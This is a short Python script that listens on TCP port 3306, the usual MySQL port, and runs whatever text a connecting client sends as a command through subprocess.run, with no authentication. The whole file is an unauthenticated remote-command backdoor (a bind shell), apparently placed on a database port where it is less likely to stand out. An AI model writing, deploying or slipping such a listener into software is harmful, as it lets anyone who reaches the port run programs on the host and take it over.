import socket, threading, subprocess

connections = []

def handle_user_connection(connection, address):
    print(connection)

    while True:
        try:
            msg = connection.recv(1024)
            if msg:
                subprocess.run(msg.decode())
        except Exception as e:
            print(e)

        
    
LISTENING_PORT = 3306

try:
    # Create server and specifying that it can only handle 4 connections by time!
    socket_instance = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket_instance.bind(('', LISTENING_PORT))
    socket_instance.listen(4)

    print('Server running!')
    
    while True:
        socket_connection, address = socket_instance.accept()
        connections.append(socket_connection)
        threading.Thread(target=handle_user_connection, args=[socket_connection, address]).start()
except Exception as e:
    print(e)
